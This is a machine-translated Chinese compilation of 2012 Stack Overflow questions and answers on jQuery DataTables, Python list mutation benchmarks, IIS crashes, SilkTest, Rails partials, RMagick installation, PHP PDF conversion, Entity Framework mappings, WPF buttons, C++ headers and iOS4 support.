instance.selectors.banner.load('http://localhost/'+url+'#inner'); 
```

对比

```
instance.selectors.banner.load('http://localhost/'+url+' #inner'); 
```

# jquery - jQuery 数据表标题对齐错误 Chrome/Safari

> ID：10305753
> 
> 赞同：0
> 
> 时间：2012-04-24T20:47:05.470
> 
> 标签：jquery, datatable, datatables

我似乎在使用 Chrome 和 Safari 时遇到了一些问题，即当浏览器未最大化或全屏或较低分辨率时，标题列如何显示标题。我找不到关于这个主题的任何东西，所以我希望这里有人可以给我一根骨头。

无论如何，这里有几个屏幕截图，一个来自低分辨率的 Firefox，一个是低分辨率的 chrome，还有一个尽管窗口和分辨率大小，它看起来应该多么理想，但如果可能的话，理想情况下我会选择 Firefox。

我认为它的方式是我认为这可能是 Chrome 和 Safari 处理填充以及文本换行的方式，但我可能是错的。无论哪种方式，我都需要修复或找出是否没有解决方法

在 Chrome 中：

![铬合金](../Images/1d763c47657ba060c9418141bd592d39.png)

在火狐中：

![火狐](../Images/cb48d82f9bfe0eb656ac280b99413808.png)

很高兴在所有浏览器中都采用这种方式：

![理想的](../Images/04480e75dede6fab10a2d63d03b3b380.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T20:49:59.867

看起来您已将列宽设置为与文本的宽度非常接近。增加您设置的列宽。

除此之外，请尝试`whitespace:nowrap;`在标题单元格上进行设置。

# python - 迭代列表时更改列表的最佳方法

> ID：10305762
> 
> 赞同：10
> 
> 时间：2012-04-24T20:47:40.310
> 
> 标签：python, loops, dynamic

我在 python 脚本（v2.6）中有几个实例，我需要就地修改列表。我需要从列表中弹出值以响应用户的交互式输入，并且想知道最干净的方法。目前，我有以下非常肮脏的解决方案：a）将列表中要删除的项目设置为 False 并使用过滤器或列表理解将它们删除，或者 b）在循环时生成一个全新的列表，这似乎是不必要的将变量添加到命名空间并占用内存。

这个问题的一个例子如下：

```
for i, folder in enumerate(to_run_folders):
    if get_size(folder) < byte_threshold:
        ans = raw_input(('The folder {0}/ is less than {1}MB.' + \
                    ' Would you like to exclude it from' + \
                    ' compression? ').format(folder, megabyte_threshold))
        if 'y' in ans.strip().lower():
            to_run_folders.pop(i) 
```

我想查看列表中的每个文件夹。如果当前文件夹小于某个大小，我想询问用户是否要排除它。如果有，请从列表中弹出该文件夹。

这个例程的问题是，如果我遍历列表，我会得到意外的行为和提前终止。如果我通过切片对副本进行迭代，pop 不会提取正确的值，因为索引被移动，并且随着更多项目的弹出，问题变得更加复杂。我也需要在脚本的其他区域进行这种动态列表调整。这种功能有什么干净的方法吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-24T20:55:44.743

您可以向后循环列表，或使用视图对象。

有关如何向后循环列表，请参阅[https://stackoverflow.com/a/181062/711085 。](https://stackoverflow.com/a/181062/711085)基本上使用`reversed(yourList)`（这会创建一个向后访问的视图对象）。

如果你需要索引，你可以这样做`reversed(enumerate(yourList))`，但这会有效地在内存中创建一个临时列表，因为`enumerate`需要在启动之前运行`reversed`。你需要进行索引操作，或者这样做：

```
for i in xrange(len(yourList)-1, -1, -1):
    item = yourList[i]
    ... 
```

甚至更清洁：`reversed`知道`range`，因此您可以在 python3 中执行此操作，或者如果您改用 python2 则可以在 python2 中执行此操作`xrange`：

```
for i in reversed(range(len(yourList))):  
    item = yourList[i]
    ... 
```

（证明：你可以这样做`next(reversed(range(10**10)))`，但如果使用 python2，这会使你的计算机崩溃）

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-24T20:57:58.813

你可以向后循环

向后：

```
x = range(10)
l = len(x)-1  # max index

for i, v in enumerate(reversed(x)):
    if v % 2:
        x.pop(l-i)  # l-1 is the forward index 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-24T21:09:59.607

> 目前，我有以下非常肮脏的解决方案：a）将列表中要删除的项目设置为 False 并使用过滤器或列表理解将它们删除，或者 b）在循环时生成一个全新的列表，这似乎是不必要的将变量添加到命名空间并占用内存。

实际上，这不是那么肮脏的解决方案。列表通常有多长？即使创建新列表也不应该消耗太多内存，因为列表只包含引用。

您还可以在循环中`while`循环并自己枚举，`del lst[n]`如果用户决定则执行（可能单独计算原始位置中的位置）。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-24T22:53:26.227

好的，我已经测量了解决方案。颠倒的解决方案大致相同。前向`while`循环慢了大约 4 倍。 **但！****对于 100,000 个随机整数列表[Patrik2 中的错误已更正]** ，Patrik 的*脏*解决方案大约快 80 倍：

 **```
import timeit
import random

def solution_ninjagecko1(lst):
    for i in xrange(len(lst)-1, -1, -1):
        if lst[i] % 2 != 0:    # simulation of the choice
            del lst[i]
    return lst

def solution_jdi(lst):
    L = len(lst) - 1
    for i, v in enumerate(reversed(lst)):
        if v % 2 != 0:
            lst.pop(L-i)  # L-1 is the forward index
    return lst

def solution_Patrik(lst):
    for i, v in enumerate(lst):
        if v % 2 != 0:         # simulation of the choice
            lst[i] = None
    return [v for v in lst if v is not None]

def solution_Patrik2(lst):
    ##buggy lst = [v for v in lst if v % 2 != 0]
    ##buggy return [v for v in lst if v is not None]
    # ... corrected to
    return [v for v in lst if v % 2 != 0]

def solution_pepr(lst):
    i = 0                      # indexing the processed item
    n = 0                      # enumerating the original position
    while i < len(lst):
        if lst[i] % 2 != 0:    # simulation of the choice
            del lst[i]         # i unchanged if item deleted
        else:
            i += 1             # i moved to the next
        n += 1
    return lst

def solution_pepr_reversed(lst):
    i = len(lst) - 1           # indexing the processed item backwards
    while i > 0:
        if lst[i] % 2 != 0:    # simulation of the choice
            del lst[i]         # i unchanged if item deleted
        i -= 1                 # i moved to the previous
    return lst

def solution_steveha(lst):
    def should_keep(x):
        return x % 2 == 0
    return filter(should_keep, lst)

orig_lst = range(30)
print 'range() generated list of the length', len(orig_lst)
print orig_lst[:20] + ['...']   # to have some fun :)

lst = orig_lst[:]  # copy of the list
print solution_ninjagecko1(lst)

lst = orig_lst[:]  # copy of the list
print solution_jdi(lst)

lst = orig_lst[:]  # copy of the list
print solution_Patrik(lst)

lst = orig_lst[:]  # copy of the list
print solution_pepr(lst)

orig_lst = [random.randint(1, 1000000) for n in xrange(100000)]
print '\nrandom list of the length', len(orig_lst)
print orig_lst[:20] + ['...']   # to have some fun :)

lst = orig_lst[:]  # copy of the list
t = timeit.timeit('solution_ninjagecko1(lst)',
                  'from __main__ import solution_ninjagecko1, lst',
                  number=1)
print 'solution_ninjagecko1: ', t

lst = orig_lst[:]  # copy of the list
t = timeit.timeit('solution_jdi(lst)',
                  'from __main__ import solution_jdi, lst',
                  number=1)
print 'solution_jdi: ', t

lst = orig_lst[:]  # copy of the list
t = timeit.timeit('solution_Patrik(lst)',
                  'from __main__ import solution_Patrik, lst',
                  number=1)
print 'solution_Patrik: ', t

lst = orig_lst[:]  # copy of the list
t = timeit.timeit('solution_Patrik2(lst)',
                  'from __main__ import solution_Patrik2, lst',
                  number=1)
print 'solution_Patrik2: ', t

lst = orig_lst[:]  # copy of the list
t = timeit.timeit('solution_pepr_reversed(lst)',
                  'from __main__ import solution_pepr_reversed, lst',
                  number=1)
print 'solution_pepr_reversed: ', t

lst = orig_lst[:]  # copy of the list
t = timeit.timeit('solution_pepr(lst)',
                  'from __main__ import solution_pepr, lst',
                  number=1)
print 'solution_pepr: ', t

lst = orig_lst[:]  # copy of the list
t = timeit.timeit('solution_steveha(lst)',
                  'from __main__ import solution_steveha, lst',
                  number=1)
print 'solution_steveha: ', t 
```

它打印在我的控制台上：

```
c:\tmp\_Python\Patrick\so10305762>python a.py
range() generated list of the length 30
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, '...']
[0, 2, 4, 6, 8, 10, 12, 14, 16, 18, 20, 22, 24, 26, 28]
[0, 2, 4, 6, 8, 10, 12, 14, 16, 18, 20, 22, 24, 26, 28]
[0, 2, 4, 6, 8, 10, 12, 14, 16, 18, 20, 22, 24, 26, 28]
[0, 2, 4, 6, 8, 10, 12, 14, 16, 18, 20, 22, 24, 26, 28]

random list of the length 100000
[915411, 954538, 794388, 847204, 846603, 454132, 866165, 640004, 930488, 609138,
 333405, 986073, 318301, 728151, 996047, 117633, 455353, 581737, 55350, 485030,
'...']
solution_ninjagecko1:  2.41921752625
solution_jdi:  2.45477176569
solution_Patrik:  0.0468565138865
solution_Patrik2:  0.024270403082
solution_pepr_reversed:  2.43338888043
solution_pepr:  9.11879694207 
```

所以，我尝试了更长的列表。只使用两倍的时间会产生很大的不同（在我的旧电脑上）。Patrik 的*肮脏*解决方案表现得非常好。它比反向解决方案快约 200 倍：

```
random list of the length 200000
[384592, 170167, 598270, 832363, 123557, 81804, 319315, 445945, 178732, 726600,
516835, 392267, 552608, 40807, 349215, 208111, 880032, 520614, 384119, 350090, 
'...']
solution_ninjagecko1:  17.362140719
solution_jdi:  17.86837545
solution_Patrik:  0.0957998851809
solution_Patrik2:  0.0500024444448
solution_pepr_reversed:  17.5078452708
solution_pepr:  52.175648581 
```

**[在 ninjagecko 评论后添加]**

修正后的 Patrik2 解决方案比 2 阶段 Patrick 解决方案快大约两倍。

为了模拟不那么频繁地删除元素，测试 like`if v % 2 != 0:`已更改为`if v % 100 == 0:`. 然后应该删除大约 1% 的项目。很明显，它需要更少的时间。对于列表中的 500,000 个随机整数，结果如下：

```
random list of the length 500000
[403512, 138135, 552313, 427971, 42358, 500926, 686944, 304889, 916659, 112636,
791585, 461948, 82622, 522768, 485408, 774048, 447505, 830220, 791421, 580706, 
'...']
solution_ninjagecko1:  6.79284210703
solution_jdi:  6.84066913532
solution_Patrik:  0.241242951269
solution_Patrik2:  0.162481823807
solution_pepr_reversed:  6.92106007886
solution_pepr:  7.12900522273 
```

Patrick 的解决方案仍然快 30 倍左右。

**[添加于 2012 年 4 月 25 日]**

另一种就地工作的解决方案，向前循环，与帕特里克的解决方案一样快。删除元素时，它不会移动所有尾部。相反，它将想要的元素移动到它们的最终位置，然后切断列表中未使用的尾部。

```
def solution_pepr2(lst):
    i = 0
    for v in lst:
        lst[i] = v              # moving the element (sometimes unneccessary)
        if v % 100 != 0:        # simulation of the choice
            i += 1              # here will be the next one
    lst[i:] = []                # cutting the tail of the length of the skipped
    return lst

# The following one only adds the enumerate to simulate the situation when
# it is needed -- i.e. slightly slower but with the same complexity.        
def solution_pepr2enum(lst):
    i = 0
    for n, v in enumerate(lst):
        lst[i] = v              # moving the element (sometimes unneccessary)
        if v % 100 != 0:        # simulation of the choice
            i += 1              # here will be the next one
    lst[i:] = []                # cutting the tail of the length of the skipped
    return lst 
```

与上述解决方案相比`v % 100 != 0`：

```
random list of the length 500000
[533094, 600755, 58260, 295962, 347612, 851487, 523927, 665648, 537403, 238660,
781030, 940052, 878919, 565870, 717745, 408465, 410781, 560173, 51010, 730322, 
'...']
solution_ninjagecko1:  1.38956896051
solution_jdi:  1.42314502685
solution_Patrik:  0.135545530079
solution_Patrik2:  0.0926935780151
solution_pepr_reversed:  1.43573239178
solution_steveha:  0.122824246805
solution_pepr2:  0.0938177241656
solution_pepr2enum:  0.11096263294 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-24T23:37:38.110

处理这个问题的最好方法，最“Pythonic”的方法，实际上是循环你的列表并创建一个只包含你想要的文件夹的新列表。这是我的做法：

```
def want_folder(fname):
    if get_size(folder) >= byte_threshold:
        return True
    ans = raw_input(('The folder {0}/ is less than {1}MB.' + \
                ' Would you like to exclude it from' + \
                ' compression? ').format(folder, megabyte_threshold))
    return 'y' not in ans.strip().lower()

to_run_folders = [fname for fname in to_run_folders if want_folder(fname)] 
```

如果您的列表确实很大，那么您可能需要担心此解决方案的性能并使用肮脏的技巧。但是，如果您的列表那么大，那么让人工回答有关可能显示的所有文件的是/否问题可能有点疯狂。

性能是一个实际问题还是只是一种烦人的担忧？因为我很确定上面的代码对于实际使用来说已经足够快了，而且它比复杂的代码更容易理解和修改。

编辑：@jdi 在评论中建议使用`itertools.ifilter()`或`filter()`

我测试过，这实际上应该比我上面显示的要快：

```
to_run_folders = filter(want_folder, to_run_folders) 
```

我刚刚复制了@pepr 的基准测试代码，并使用`filter()`此处所示的方法测试了解决方案。它总体上是第二快的，只有 Patrik2 更快。Patrik2 的速度是原来的两倍，但同样，任何小到足以让人类回答“是/否”问题的数据集都可能足够小，以至于两倍不会有太大影响。

编辑：只是为了好玩，我继续写了一个纯列表理解的版本。它只有一个表达式来评估，没有 Python 函数调用。

```
to_run_folders = [fname for fname in to_run_folders
        if get_size(fname) >= mb_threshold or
                'y' not in raw_input(('The folder {0}/ is less than {1}MB.' +
                ' Would you like to exclude it from compression? '
                ).format(fname, mb_threshold)).strip().lower()

] 
```

呸！我更喜欢制作一个功能。**

# c# - 发送大 XML 时 IIS 7.5 崩溃

> ID：10305765
> 
> 赞同：2
> 
> 时间：2012-04-24T20:47:49.693
> 
> 标签：c#, asp.net-mvc, .net-4.0, windows-server-2008, iis-7.5

我有一个返回 XML 文件的 Web 服务。

第一个请求返回一个大小约为 50MB 的 XML 文件，任何新请求都会小得多，更像是 1KB 左右。

我的 IIS 在发送大 XML 时崩溃（仅在第一个请求时）。

我收到错误 504，在事件查看器中我可以看到：

```
Faulting application name: w3wp.exe, version: 7.5.7601.17514, time stamp: 0x4ce7afa2
Faulting module name: clr.dll, version: 4.0.30319.239, time stamp: 0x4e1822f4
Exception code: 0xc00000fd
Fault offset: 0x0000000000001177
Faulting process id: 0x15cc
Faulting application start time: 0x01cd225011f055d0
Faulting application path: c:\windows\system32\inetsrv\w3wp.exe
Faulting module path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
Report Id: 5110375b-8e43-11e1-b097-001b217fde7f 
```

我试图用谷歌搜索这个错误，但一无所获！

我想也许我应该增加应用程序池内存大小或 CPU 使用率，不确定是否是问题所在。

你们有什么想法吗？如何解决？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T20:55:54.387

0xc00000fd 是....堆栈溢出！所以听起来你需要附加一个调试器，看看发生了什么

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T20:51:04.677

尝试发送小 XML 而不是大 XML。

# ide - 替代 SilkTest IDE

> ID：10305772
> 
> 赞同：1
> 
> 时间：2012-04-24T20:48:44.473
> 
> 标签：ide, silktest

来自 Eclipse 的许多功能根本不存在于 SilkTest IDE 中。

我的问题是这样的：

是否有可用于维护 SilkTest 脚本的 SilkTest 替代 IDE？可以提供 Eclipse 和许多其他主流 IDE 带来的某些功能的东西吗？

我指的一些力量是：

*   大纲功能
*   引用/调用层次结构
*   格式化程序
*   基于上下文的搜索（对变量名的函数调用）
*   声明/定义链接

如果答案是“否”，那是可以接受的，也是我所期望的，但我会等待一小段时间，让其他人有机会回答。此外，我们拥有 SilkTest 的 2009 年许可证。如果这些功能在较新版本的 IDE 中可用，那也是可以接受的答案。

谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-25T06:42:49.027

对于 4Test（SilkTest 的经典脚本语言），答案是“否”。

然而，一段时间以来，Silk4J 和 Silk4Net 出现了，它们允许您使用 Java 或 .Net 语言在 Eclipse 或 Visual Studio 中创建测试脚本。然后，您可以使用 IDE 提供的所有功能。

注意：我在 SilkTest 团队为 Borland 工作，所以我的回答可能有偏见。

# ruby-on-rails - HAML 部分 - 呈现部分错误

> ID：10305778
> 
> 赞同：1
> 
> 时间：2012-04-24T20:48:59.947
> 
> 标签：ruby-on-rails, ruby, haml, partials

我有这行代码：

```
 = render :partial => "views/influencers/disclosures/shared/list" 
```

我收到了这个错误：

```
Missing partial views/influencers/disclosures/shared/list with {:locale=>[:en, :en], :handlers=>[:haml, :erb, :builder], :formats=>[:html]}. Searched in: 
```

我试图渲染的部分在这个目录中：

```
app/views/influencers/disclosures/shared/_list.html.haml 
```

我正在尝试从位于此处的文件中调用此部分内容：

```
app/views/mobile/disclosures/index.html.haml 
```

知道为什么它不会被识别以及为什么会发生这个错误吗？

谢谢！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T20:58:36.473

用。。。来代替：

```
= render :partial => "/influencers/disclosures/shared/list" 
```

# ruby-on-rails - Gem Rmagick 安装错误：extconf.rb:171:in ``': No such file or directory - convert -version (Errno::ENOE NT)

> ID：10305781
> 
> 赞同：3
> 
> 时间：2012-04-24T20:49:17.313
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, imagemagick, rmagick

安装 rmagick 时出现此错误，我遵循了所有类型的指南并且每次都得到相同的错误。这次我遵循了本指南：[http](http://www.youtube.com/watch?v=gEWAVlNCKhg&feature=youtu.be) ://www.youtube.com/watch?v=gEWAVlNCKhg&feature=youtu.be ：

```
 C:/Ruby192/bin/ruby.exe extconf.rb --with-opt-include=C:/ImageMagick/Sou
    rceCode --with-opt-lib=C:/ImageMagick
    checking for Ruby version >= 1.8.5... yes
    *** extconf.rb failed ***
    Could not create Makefile due to some reason, probably lack of
    necessary libraries and/or headers.  Check the mkmf.log file for more
    details.  You may need configuration options.

    Provided configuration options:
            --with-opt-dir
            --without-opt-dir
            --with-opt-include=${opt-dir}/include
            --with-opt-lib=${opt-dir}/lib
            --with-make-prog
            --without-make-prog
            --srcdir=.
            --curdir
            --ruby=C:/Ruby192/bin/ruby
    extconf.rb:171:in ``': No such file or directory - convert -version (Errno::ENOE
    NT)
            from extconf.rb:171:in `<main>'

    Gem files will remain installed in C:/Ruby192/lib/ruby/gems/1.9.1/gems/rmagick-2
    .13.1 for inspection.
    Results logged to C:/Ruby192/lib/ruby/gems/1.9.1/gems/rmagick-2.13.1/ext/RMagick
    /gem_make.out

    c:\> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-24T21:09:39.893

根据错误：

```
extconf.rb:171:in ``': No such file or directory - convert -version
(Errno::ENOENT) 
```

看来您没有安装 Imagemagick（或同等产品）。Imagemagick 套件中的主要应用程序是`convert`二进制文件。如果您确定*确实*安装了它，那么您应该检查它是否可以在`PATH`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-25T08:57:19.457

首先我想我应该在系统中设置环境变量。

但是在命令视图中设置这些变量：

```
set DFImageMagick = C:\ImageMagick
set PATH=%DFImageMagick%;%PATH% (if you don't already have it in PATH)
set CPATH=%DFImageMagick%\include;%CPATH%
set LIBRARY_PATH=%DFImageMagick%\lib;%LIBRARY_PATH% 
```

然后运行命令`gem install rmagick`

并且 gem 安装没有任何错误！

# php - 如何在 PHP 中使用谷歌文档查看器或其他应用程序将 PDF 转换为位图

> ID：10305783
> 
> 赞同：-1
> 
> 时间：2012-04-24T20:49:29.410
> 
> 标签：php, pdf, google-docs, google-docs-api

我有一个带有 pdf 文件的 url，我需要它来转换为 jpegs 或 pngs。任何机构都可以帮助我吗？我为我的网站使用 php，我需要这个功能。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:57:58.537

使用`imagemagick` [http://www.imagemagick.org/script/index](http://www.imagemagick.org/script/index)。

例子

```
$url = "" ; //URl to document ;
$tmp = tmpfile() . ".pdf";
file_put_contents($tmp, file_get_contents($url));
exec("convert -density 300 $tmp image.jpg"); 
```

# asp.net-mvc-3 - 在 C# 模型中使用复杂类型与单个属性

> ID：10305786
> 
> 赞同：0
> 
> 时间：2012-04-24T20:49:50.870
> 
> 标签：asp.net-mvc-3, entity-framework

我正在创建一个应用程序，其中使用代码优先的实体框架。我已经创建了一些模型，但在我继续之前，我想验证一些事情。我创建的模型适用于产品、客户和订单等内容。我还创建了一些用作类型的模型，例如地址。例如：

```
public class Customer
{
    public int CustomerID { get; set; }
    public string CustomerName { get; set; }
    public string CustomerEmail { get; set; }
    public string PhoneNumber { get; set; }
    public Address ShippingAddress { get; set; }
    public Address BillingAddress { get; set; }
}

public class Address
{
    public string AddressLineOne { get; set; }
    public string AddressLineTwo { get; set; }
    public string Company { get; set; }
    public string City { get; set; }
    public string State { get; set; }
    public int ZipCode { get; set; }
    public string Country { get; set; }
} 
```

这比创建单个属性（例如 ShipToAddress、ShipToState 等）更可取吗？我对 Web 开发还很陌生，不想重新开始，因为这会导致一些问题。提前感谢您的任何帮助，如果我不够清楚，我提前道歉。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:52:50.297

是的，这是更好的方法，然后为 ShipToState 等创建单独的属性。这样，您也可以将 Address 类与其他类一起使用。

# c# - EF 4.3 关系不正确

> ID：10305788
> 
> 赞同：2
> 
> 时间：2012-04-24T20:50:07.583
> 
> 标签：c#, entity-framework, entity-framework-4, ef-code-first, entity-framework-4.3

```
public class ObjectA
{
    public Guid Id {get; set;}
    public virtual ObjectB Objectb {get; set;}
}

public class ObjectB
{
    public Guid Id {get; set;}
    public Guid ObjectAId {get; set;}
    public virtual ObjectA ObjectA {get; set;}
} 
```

我没有运气让关系正确。

```
modelBuilder.Entity<ObjectA>()
    .HasRequired(p => p.ObjectB)
    .WithRequiredPrincipal()
    .WillCascadeOnDelete(false); 
```

创建了两个关系：

1.  Object.ObjectA/ObjectA.Id
2.  对象A.Id/ObjectB.Id

如何让 EF 停止创建关系 #2？这不正确，也不是我想要的。

错误的：

```
modelBuilder.Entity<ObjectA>().HasRequired(x => x.Objectb).WithRequiredPrincipal(x => x.ObjectA);

    ALTER TABLE [dbo].[ObjectBs]  WITH CHECK ADD  CONSTRAINT [FK_ObjectBs_ObjectAs_Id] FOREIGN KEY([Id])
    REFERENCES [dbo].[ObjectAs] ([Id])
    GO 
```

几乎正确：

```
modelBuilder.Entity<ObjectA>().HasOptional(x => x.Objectb).WithOptionalPrincipal(x => x.ObjectA);

ALTER TABLE [dbo].[ObjectBs]  WITH CHECK ADD  CONSTRAINT [FK_ObjectBs_ObjectAs_ObjectA_Id] FOREIGN KEY([ObjectA_Id])
REFERENCES [dbo].[ObjectAs] ([Id])
GO 
```

添加了一个额外的列，所以我最终在 ObjectB 中得到了 ObjectAId 和 ObjectA_Id。

```
modelBuilder.Entity<ObjectA>().HasOptional(x => x.Objectb).WithOptionalPrincipal(x => x.ObjectA).Map(x => x.MapKey("ObjectAId")); 
```

引发异常：类型中的每个属性名称都必须是唯一的。已定义属性名称“ObjectAId”。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-25T18:13:06.640

从 中删除外键属性`ObjectB`：

```
public class ObjectA
{
    public Guid Id {get; set;}
    public virtual ObjectB Objectb {get; set;}
}

public class ObjectB
{
    public Guid Id {get; set;}
    public virtual ObjectA ObjectA {get; set;}
} 
```

并将此映射与 Fluent API 一起使用：

```
modelBuilder.Entity<ObjectA>()
    .HasRequired(a => a.ObjectB)
    .WithRequiredPrincipal(b => b.ObjectA)
    .WillCascadeOnDelete(false); 
```

需要移除外属性的原因是 EF 不支持 One-to-One Foreign Key Associations ，而只支持[One-to-One Shared Primary Key Associations](http://weblogs.asp.net/manavi/archive/2011/04/14/associations-in-ef-4-1-code-first-part-3-shared-primary-key-associations.aspx)。

如果您想要一个一对一的外键关联，其中依赖项有一个外键作为与主键不同的唯一键，[那么只有一种解决方法](http://weblogs.asp.net/manavi/archive/2011/05/01/associations-in-ef-4-1-code-first-part-5-one-to-one-foreign-key-associations.aspx)可以将您的模型映射为没有导航属性的一对多关系在关系的许多方面和数据库中的唯一约束，如下所示：

```
public class ObjectA
{
    public Guid Id {get; set;}
}

public class ObjectB
{
    public Guid Id {get; set;}
    public Guid ObjectAId {get; set;}
    public virtual ObjectA ObjectA {get; set;}
}

modelBuilder.Entity<ObjectB>()
    .HasRequired(b => b.ObjectA)
    .WithMany()
    .HasForeignKey(b => b.ObjectAId)
    .WillCascadeOnDelete(false); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-25T23:52:17.193

这是在按照 Slauma 的建议删除外键属性后最终起作用的方法。

```
 modelBuilder.Entity<ObjectA>()
    .HasOptional(x => x.ObjectB)
    .WithRequired(x => x.ObjectA)
    .Map(x => x.MapKey("ObjectAId"))
    .WillCascadeOnDelete(true); 
```

我必须映射属性，否则外键是在主键上创建的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-24T21:04:15.883

我想你想要：

```
modelBuilder.Entity<ObjectA>()
    .HasRequired(p => p.ObjectB)
    .HasForeignKey(p => p.ObjectAId); 
```

取自[http://msdn.microsoft.com/en-us/data/hh134698](http://msdn.microsoft.com/en-us/data/hh134698)

# wpf - 没有ButtonChrome的WPF中的按钮按下动画？

> ID：10305789
> 
> 赞同：0
> 
> 时间：2012-04-24T20:50:11.733
> 
> 标签：wpf, animation, button

我的 WPF 应用程序内部发生了奇怪的交互。我已经设计了所有按钮的样式，使它们具有深蓝色背景和白色字母。它们看起来很棒，直到您单击它们并获得焦点。在那之后，字面上的眨眼，背景颜色逐渐褪色为我选择的乳白色。这会分散用户的注意力，必须去。

我们假设 ButtonChrome 负责这个看起来很奇怪的动画。因此，我想更改按钮的模板，以便在按钮获得焦点时使用带有背景颜色的矩形和围绕文本的虚线。但我仍然希望按钮看起来像是在单击时被压入应用程序。

在没有 ButtonChrome 的情况下如何有效地完成这一点动画？

托尼

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-25T10:07:13.870

使用 VisualStateManager 并包含 Focussed 和/或 IsPressed 状态的动画

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-03T19:01:20.507

事实证明，如果你想让你的按钮正确地动画，你需要一个 ButtonChrome。事实证明，解决方案是创建您自己的 ButtonChrome 类并以您的风格使用它。请注意，我不想摆脱所有动画，只是当控件是默认按钮或具有焦点时发生的动画。

我能够在 StackOverflow 上的另一篇文章中找到 Aero Theme ButtonChrome 的来源，该文章处理了类似的问题。我现在没有方便的 URL。当我找到它时，我将使用该 URL 更新此答案。

无论如何，我删除了有问题的动画，现在我的按钮没有不需要的效果。

# c++ - 在命名空间/头文件中找不到类

> ID：10305791
> 
> 赞同：1
> 
> 时间：2012-04-24T20:50:22.160
> 
> 标签：c++, class, namespaces, header-files

我创建了一个类并将其拆分为源文件和头文件，但我无法让它们相互交谈。

我的头文件，`GridLayout.h`看起来像这样：

```
#ifndef GRIDLAYOUT_H_INCLUDED
#define GRIDLAYOUT_H_INCLUDED

#include <vector>
#include <types.h>
#include "GridPlaceable.h"

namespace Spaceships {

class GridLayout {
    //consider replace with std::list
    typedef std::vector<GridPlaceable*> column;

    public:
        GridLayout();
        ~GridLayout();

        void arrange();
        void splitColumn(size_t colNo, distance position);
        void splitRow(size_t rowNo, distance position);
        bool placeOne(GridPlaceable* thatOne);

private:
        bool tryToFit(GridPlaceable* thatOne, size_t startCol, size_t startCell);

        std::vector<column> wholeGrid;
        std::vector<GridPlaceable*> toPlace;

        std::vector<distance> rowHeights, colWidths;
        std::vector<size_t> firstEmpties;

        bool mandates;
};

}; 
```

`GridLayout.cpp`好像：

```
#include "GridLayout.h"

namespace Spaceships {

GridLayout::GridLayout() {

}

//GridLayout::aBunchOfOtherFunctions() { }

}

#endif 
```

当我编译时，我得到了一大堆`GridLayout does not name a type`错误。这可能是什么原因造成的？我似乎记得曾经通过输入一堆分号来解决类似的问题，但这一次似乎不起作用。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-24T21:14:29.197

您的“实际头文件”包含两个默认构造函数的声明：

```
public:
    GridLayout();
    GridLayout(); 
```

您应该删除其中之一。

**编辑**：现在您`#endif`在标题末尾缺少一个，并且在文件末尾有一个太多`.cpp`...

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-27T18:24:57.970

弄清楚了！我会把它放在这里以防它对某人有帮助。

我必须在某个时候将 GridLayout.h 设置为编译，然后将其更改回来，因为目录中有一个 GridLayout.gch。所以编译器一定是直截了当，完全忽略了 .h 。我删除了该文件，现在它向我显示了我的代码中的所有*真正*错误。

# objective-c - 将 iOS5 应用程序转换为能够支持 iOS4.2

> ID：10305792
> 
> 赞同：0
> 
> 时间：2012-04-24T20:50:22.803
> 
> 标签：objective-c, ios, ios5, storyboard

我刚刚使用 XCode 4.2 创建了我的第一个 iOS 应用程序。该应用程序仅在 iOS5 上运行。

我还需要让它在 iOS4 上运行。

我有一个 MainstoryBoard，我准备摆脱它并改用 nib 文件。

问题是，一旦我删除 MainStoryBoard，我该怎么做才能让它进入第一堂课？需要做哪些设置才能兼容iOS4.2？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T21:16:03.737

用户1051935，

故事板在 4.xxx 中不受支持，仅在 5.0 及更高版本中。要让第一个视图控制器在启动时加载，您需要修改 appdelegate 文件以在窗口中加载第一个视图控制器的 nib 文件。这不仅仅是调整设置，因为 4.xxx 中处理 segue 和 nib 的方式与 ios5 中的情节提要方法有点不同。您还需要以编程方式在视图之间创建转场。我会建议拿起一本关于 ios 4 编程的好书。有很多可用的，现在 5.0 出来了，我发现有很多打折的。这将引导您逐步完成单独使用 nib、创建委托和协议以及在视图之间切换。我自己从 Storyboard 开始，然后倒退到 ios4-way pre-storyboards。这可能不是最聪明或最简单的路线，但它是可能的。现在我在代码中使用视图，实际上我更喜欢它，并且没有看到故事板有太多优势，除非我正在开发一个非常复杂的应用程序（结构上）。你仍然可以使用 ARC 与 4.xxx ios 基础，这是一个祝福！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-25T08:37:56.167

@MySpecialPurpose 的回答是 iOS 4.2 支持的必要第一步。但是，我是否可以假设您正在支持该版本，以便您的应用程序可以在第二代和第三代 iPhone 和 iPod touch 上运行？如果是这样，您还必须为这些设备上的**armv6**处理器进行编译，并更新您的功能。

在您的**Build Settings**中，找到**Architectures**并添加**armv6**，如下所示。您可能会发现您的现有值是**armv7**，或者它是**$(ARCHS_STANDARD_32_BIT**。无论其中哪一个存在，都不要使用它。

